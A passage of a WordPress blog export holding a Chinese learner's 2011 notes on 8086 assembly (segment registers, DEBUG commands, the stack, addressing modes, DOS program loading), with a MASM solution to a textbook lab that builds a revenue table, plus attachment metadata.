<strong>物理地址</strong>：所有的内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间中都有一个唯一的地址，也即物理地址。CPU通过地址总线送入存储器的，必须是一个内存单元的物理地址。在CPU向地址总线发出物理地址之前，必须要在内部先形成这个物理地址。不同的CPU可以有不同的物理地址形成方式。

8086CPU是16位结构的CPU，具有以下特性：<img class="alignright" style="float: right;" src="http://files.blogcn.com/wp06/M00/02/D0/wKgKDE5sHkgAAAAAAAB_IkT2oIg330.png" alt="" width="282" height="166" />
<ul>
	<li>运算器一次最多处理16位数据</li>
	<li>寄存器的最大宽度为16位</li>
	<li>寄存器和运算器之间的通路为16位</li>
</ul>
也就是说，在8086内部，一次能处理、传输、暂时存储的信息最大长度是16位。8086却有20位地址总线，达到1MB的寻址能力。

如果将地址从内部简单发出，那么只能寻址64KB，于是8086在内部采用了两个16位地址合成的方法来形成20位的物理地址：段地址和偏移地址，通过地址加法器来进行合成，合成之后通过输入输出控制电路送往20位的地址总线，进而被传送到存储器。

地址加法器采用：物理地址 = 段地址 * 16 + 偏移地址。其本质含义是：CPU在访问内存时，用一个基础地址和一个相对于基础地址的偏移地址相加，给出内存单元的物理地址。

不过内存并没有分段，段的划分来自CPU。在编程时可以根据需要，将若干地址连续的内存单元看作一个段。一个段的起始地址一定是16的倍数，偏移地址为16位，段的长度最大为64KB。

<strong>段寄存器</strong>：段地址在8086CPU的段寄存器中存放，四个段寄存器分别为：CS、DS、SS、ES。

CS被称为代码段寄存器，IP被称为指令指针寄存器。在8086PC机中，任意时刻，设CS的内容为M，IP的内同为N，8086CPU将从内存M * 16 + N单元开始，读取一条指令并执行，也即<strong>任意时刻，CPU将CS:IP指向的内容当做指令执行</strong>。如果说：内存中的一段信息曾被CPU执行过，那么，它所在的内存单元，必然被CS:IP指向过。

修改CS:IP使用：jmp 段地址：偏移地址。若只修改IP，使用：jmp 寄存器。

<strong>将一段内存当做代码段，仅仅是我们在编程时的一种安排，CPU并不会由于这种安排，就自动的将我们定义的代码段中的指令当做指令来执行。CPU只认被CS:IP指向的内存单元中的内容为指令。</strong>

<strong>Debug的使用</strong>：Debug要在DOS中使用，在Windows下我们可以输入“command”进入虚拟8086模式的DOS。Debug的相关命令：
<ul>
	<li>R命令查看，改变CPU寄存器的内容</li>
	<li>D命令查看内存中的内容</li>
	<li>E命令改写内存中的内容</li>
	<li>U命令将内存中机器指令翻译为汇编指令</li>
	<li>T命令指向一条机器指令</li>
	<li>A命令以汇编指令的格式在内存中写入一条机器指令</li>
	<li>P命令用于执行int指令</li>
</ul>
<span style="color: #ff0000;">2011-09-12添加：</span>更详细的命令介绍：<a href="http://www.aogosoft.com/downpage.asp?mode=viewtext&id=66">DEBUG命令详解</a>
实验：
PC机的ROM中写有一个生产日期，在内存FFFF00H~FFFFFH的某几个单元中，请找出这个生产日期并试图改变它。
<img src="http://files.blogcn.com/wp03/M00/02/31/wKgKCk5uAkgAAAAAAAJHuFHHv_s642.jpg" alt="pcDate" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>83</wp:post_id>
		<wp:post_date>2011-09-11 11:20:47</wp:post_date>
		<wp:post_date_gmt>2011-09-11 03:20:47</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%af%84%e5%ad%98%e5%99%a8</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[11]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359085]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>汇编语言笔记——内存访问</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%86%85%e5%ad%98%e8%ae%bf%e9%97%ae/</link>
		<pubDate>Mon, 12 Sep 2011 11:39:41 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[汇编]]></category>

		<category domain="tag" nicename="%e6%b1%87%e7%bc%96"><![CDATA[汇编]]></category>

		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=87</guid>
		<description></description>
		<content:encoded><![CDATA[海上升明月，天涯共此时——中秋节

<strong>字单元</strong>：即存放一个字形数据(16位)的内存单元，由两个地址连续的内存单元组成。高地址内存单元存放高位字节，低地址单元存放低位字节，当然是针对小端机器而言。

<strong>数据段</strong>：我们可以将一组长度为N(N≤64kB)、地址连续、起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段。将一段内存当成数据段，是我们在编程时的一种安排，可以在具体操作时，用ds存放数据段的段地址，再根据需要，用相关指令访问数据段中的具体单元。8086CPU不支持将数据直接送入段寄存器的操作，只能用一个寄存器进行中转。

<strong>栈</strong>：栈在操作数据方面据有LIFO(Last In First Out,后进先出)规则。8086CPU提供相关的指令来以栈的方式访问内存空间，这意味着，在基于8086CPU编程的时候，可以将一段内存当做栈来使用。8086CPU提供的入栈和出栈指令，最基本的是push和pop，入栈和出栈操作都是以字为单位进行的。

8086CPU中，段寄存器ss用于存放栈顶的段地址，寄存器sp用于存放偏移地址。<strong>任意时刻，ss:sp指向栈顶元素</strong>。8086CPU中，入栈时，栈顶从高地址向低地址方向生长。当栈空时，ss:sp指向栈最底部单元下面的单元。8086CPU不保证我们对栈的访问不会超界，也就是说，8086CPU只知道栈顶在何处(ss:sp指示)，而不知道我们安排的栈空间有多大。

push ax:
(1) sp = sp - 2，ss:sp指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶；
(2) 将ax中的内容送入ss:sp指向的内存单元处，ss:sp此时指向新的栈顶。
pop ax:
(1) 将ss:sp指向的内存单元处的数据送入ax；
(2) sp = sp + 2，ss:sp指向当前栈顶下面的单元，以当前栈顶下面的单元作为新的栈顶。

push、pop实际上就是一种内存传送指令，可以在寄存器或内存或寄存器和内存之间传送数据。

Debug的T命令在执行修改寄存器ss的指令时，下一条指令也紧接着执行。这是因为用t命令进行调试的时候会产生中断，而为了保护现场，cpu则会依次将标志寄存器、cs、ip的值进栈。

<strong>loop指令</strong>：格式:loop 标号。CPU执行loop指令时，需要进行两步操作，1、(cx)=(cx)-1；2、判断cx中的值，不为零则转至标号处执行程序，为零则向下执行。用cx和loop指令相配合实现循环功能的程序框架：
mov cx,循环次数
s:
循环执行的程序段
loop s

<strong>Debug 和汇编器masm对指令的不同处理</strong>：Debug中，mov ax, [0]表示将ds:0处的数据送入ax。masm中，mov ax, [0]当做mov ax, 0处理。
解决方法：增加一个寄存器中转，或者显式给出段寄存器，如：mov ax, ds : [0]

<strong>数据处理的基本问题</strong>：数据处理有两个基本问题，处理的数据在什么地方和要处理的数据有多长。8086CPU中只有4个寄存器（bx、si、di、bp）可以用“[...]”中来进行内存单元的寻址。且可以组合出现，并当使用[bp]时，默认段地址在ss中。

(1) 寻址方式：
<ul>
	<li>直接寻址。如：[idata]</li>
	<li>寄存器间接寻址。如：[bx]、[si]、[di]、[bp]</li>
	<li>寄存器相对寻址。如：[bx+idata]、[si+idata]、[di+idata]、[bp+idata]</li>
	<li>基址变址寻址。如：[bx+si]、[bx+di]、[bp+si]、[bp+di]</li>
	<li>相对基址变址。如：[bx+si+idata]、[bp+si+idata]</li>
</ul>
(2)  数据长度：
<ul>
	<li>通过寄存器指明要处理的数据尺寸</li>
	<li>在没有寄存器名存在的情况下，使用操作符word/byte ptr 指明内存单元的长度</li>
	<li>有些指令默认了访问的是字单元还是字节单元，如push</li>
</ul>
<strong>程序的装载</strong>：操作系统是一个由多个功能模块组成的庞大、复杂的系统。任何通用的操作系统，都要提供一个称为shell(外壳)的程序，用户(操作人员)使用这个程序来操作计算机系统进行工作。DOS中有一个程序command.com，这个程序在DOS中称为命令解释器，也就是DOS系统的shell。

DOS系统中.exe文件中程序的加载过程如下：
<ol>
	<li>找到一段其实地址为SA:0000(即起始地址的偏移地址为0)的容量足够的空闲内存区。</li>
	<li>在这段内存区的前256字节中，创建一个称为程序段前缀（PSP）的数据区，DOS要利用PSP来和被加载的程序通信。</li>
	<li>从这段内存区的256自己开始（在PSP的后面），将程序装入，程序的地址被设为SA+10H:0。</li>
	<li>将该内存区的段地址存入ds中，初始化其他相关寄存器后（cx存放的是程序的长度），设置CS:IP指向程序的入口。</li>
</ol>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>87</wp:post_id>
		<wp:post_date>2011-09-12 19:39:41</wp:post_date>
		<wp:post_date_gmt>2011-09-12 11:39:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%86%85%e5%ad%98%e8%ae%bf%e9%97%ae</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[6]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359080]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>pcDate</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%af%84%e5%ad%98%e5%99%a8/pcdate/</link>
		<pubDate>Mon, 12 Sep 2011 12:59:52 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp03/M00/02/31/wKgKCk5uAkgAAAAAAAJHuFHHv_s642.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>89</wp:post_id>
		<wp:post_date>2011-09-12 20:59:52</wp:post_date>
		<wp:post_date_gmt>2011-09-12 12:59:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pcdate</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>83</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp03/M00/02/31/wKgKCk5uAkgAAAAAAAJHuFHHv_s642.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"820";s:6:"height";s:3:"489";s:14:"hwstring_small";s:23:"height='76' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/01/F4/wKgKDU5uAkkAAAAAAAAQM2uc9ik995.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"112";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/02/31/wKgKCk5uAkkAAAAAAAAmWFlygOg977.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"294";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/01/F4/wKgKDU5uAkkAAAAAAADwzhuGZXk305.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/01/B4/wKgKC05uAkkAAAAAAAJHuC_JqHA109.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>7asm</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%ae%9e%e9%aa%8c7/7asm/</link>
		<pubDate>Mon, 12 Sep 2011 15:02:54 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp02/M00/01/B4/wKgKC05uHx4AAAAAAAIxOn8MH9o374.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>92</wp:post_id>
		<wp:post_date>2011-09-12 23:02:54</wp:post_date>
		<wp:post_date_gmt>2011-09-12 15:02:54</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>7asm</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>90</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp02/M00/01/B4/wKgKC05uHx4AAAAAAAIxOn8MH9o374.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"815";s:6:"height";s:3:"484";s:14:"hwstring_small";s:23:"height='76' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/01/A7/wKgKC05uHx8AAAAAAAARmEQi6Pw290.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"111";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/25/wKgKC05uHx8AAAAAAAAmfVrnp6Q429.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"293";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/01/F4/wKgKDE5uHx8AAAAAAADj2mgY8CM616.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/02/D5/wKgKDE5uHx8AAAAAAAIxOjAGKCI998.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>7amsafter</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%ae%9e%e9%aa%8c7/7amsafter/</link>
		<pubDate>Mon, 12 Sep 2011 15:04:03 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp04/M00/01/F4/wKgKDU5uH2MAAAAAAAIYrHVXywU808.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>93</wp:post_id>
		<wp:post_date>2011-09-12 23:04:03</wp:post_date>
		<wp:post_date_gmt>2011-09-12 15:04:03</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>7amsafter</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>90</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp04/M00/01/F4/wKgKDU5uH2MAAAAAAAIYrHVXywU808.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"819";s:6:"height";s:3:"491";s:14:"hwstring_small";s:23:"height='76' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/01/F4/wKgKDU5uH2MAAAAAAAAQfR0SZwU858.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"112";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/02/32/wKgKCk5uH2MAAAAAAAAjMQkwuY0410.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"296";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/02/D5/wKgKDE5uH2MAAAAAAADc2F10FdU039.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/02/2B/wKgKCk5uH2MAAAAAAAIYrFOJUC0229.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>汇编语言笔记——实验7</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%ae%9e%e9%aa%8c7/</link>
		<pubDate>Mon, 12 Sep 2011 15:06:56 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[汇编]]></category>

		<category domain="tag" nicename="%e6%b1%87%e7%bc%96"><![CDATA[汇编]]></category>

		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=90</guid>
		<description></description>
		<content:encoded><![CDATA[天道酬勤，功不唐捐

Power idea公司从1975年成立一直到1995年的基本情况如下：
<table border="1">
<tbody>
<tr>
<th>年份</th>
<th>收入（千美元）</th>
<th>雇员（人）</th>
<th>人均收入（千美元）</th>
</tr>
<tr>
<td>1975</td>
<td>16</td>
<td>3</td>
<td>？</td>
</tr>
<tr>
<td>1976</td>
<td>22</td>
<td>7</td>
<td>？</td>
</tr>
<tr>
<td>1977</td>
<td>382</td>
<td>9</td>
<td>？</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
<tr>
<td>1995</td>
<td>5937000</td>
<td>17800</td>
<td>?</td>
</tr>
</tbody>
</table>
下面的程序中，已经定义好了这些数据：
data segment
db '1975','1976','1977','1978','1979','1980','1981','1982','1983'
db '1984','1985','1986','1987','1988','1989','1990','1991','1992'
db '1993','1994','1995'
;以上是表示21年的21个字符串
dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514
dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000
;以上是表示21年公司总收入的21个dword数据
dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226
dw 11542,14430,15257,17800
;以上是表示21年公司雇员人数的21个word数据
data ends

编程，将data段按一下格式写入table段中，并计算21年的人均收入，取整，结果也按下面格式保存在table段中。
年份（4字节） 空格 收入（4字节） 空格 雇员数（2字节） 空格 人均收入（2字节） 空格

这个实验考的是寻址方式的运用，我以下思路解题：
<ol>
	<li>ds存放data段基址，es存放table段基址</li>
	<li>ds以bx作字符串的基址，以bx+54h作为收入的基址，以di+0A8h作为雇员人数的基址。每循环一次，bx+4，bp+10h，di+2</li>
</ol>

代码如下：
<pre class="asm">
assume cs:code, ds:data, es:table, ss:stack

data segment
	db '1975','1976','1977','1978','1979','1980','1981','1982','1983'
	db '1984','1985','1986','1987','1988','1989','1990','1991','1992'
	db '1993','1994','1995'
	;以上是表示21年的21个字符串
	dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514
	dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000
	;以上是表示21年公司总收入的21个dword数据
	dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226
	dw 11542,14430,15257,17800
	;以上是表示21年公司雇员人数的21个word数据
data ends

table segment
	db 21 dup ('year summ ne ?? ')
table ends

stack segment
	dw 0,0,0,0,0,0,0,0
stack ends

code segment
start:
	mov ax, data
	mov ds, ax
	mov ax, table
	mov es, ax
	mov ax, stack
	mov ss, ax
	mov sp, 10h
</br>		
	xor bx, bx
	xor bp, bp
	xor di, di
	mov cx, 15h
s1:
	push cx			;outer loop
	xor si, si
	mov cx, 4
s0:
	mov al, [bx+si]		;year
	mov es:[bp+si], al
	inc si
	loop s0
</br>	
	inc si
	mov ax, 54h[bx]		;play off
	mov es:[bp+si], ax
	push ax
	add si, 2
	mov ax, 56h[bx]
	mov es:[bp+si], ax
	push ax
</br>		
	add si, 3		;2+1
	mov ax, 0A8h[di]	;person
	mov es:[bp+si], ax
</br>		
	pop dx
	pop ax
	div word ptr es:[bp+si]
</br>		
	add  si,3
	mov es:[bp+si], ax	;person play off
</br>		
	add bx, 4
	add di, 2
	add bp, 10h
	pop cx
	loop s1
</br>		
	mov ax, 4c00h
	int 21h

code ends

end start
</pre>

运行结果：
<img src="http://files.blogcn.com/wp02/M00/01/B4/wKgKC05uHx4AAAAAAAIxOn8MH9o374.jpg" alt="7asm" />
<img src="http://files.blogcn.com/wp04/M00/01/F4/wKgKDU5uH2MAAAAAAAIYrHVXywU808.jpg" alt="7asm" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>90</wp:post_id>
		<wp:post_date>2011-09-12 23:06:56</wp:post_date>
		<wp:post_date_gmt>2011-09-12 15:06:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%ae%9e%e9%aa%8c7</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[29]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359075]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>汇编语言笔记——转移指令</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e8%bd%ac%e7%a7%bb%e6%8c%87%e4%bb%a4/</link>
		<pubDate>Thu, 15 Sep 2011 14:34:01 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[汇编]]></category>

		<category domain="tag" nicename="%e6%b1%87%e7%bc%96"><![CDATA[汇编]]></category>

		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

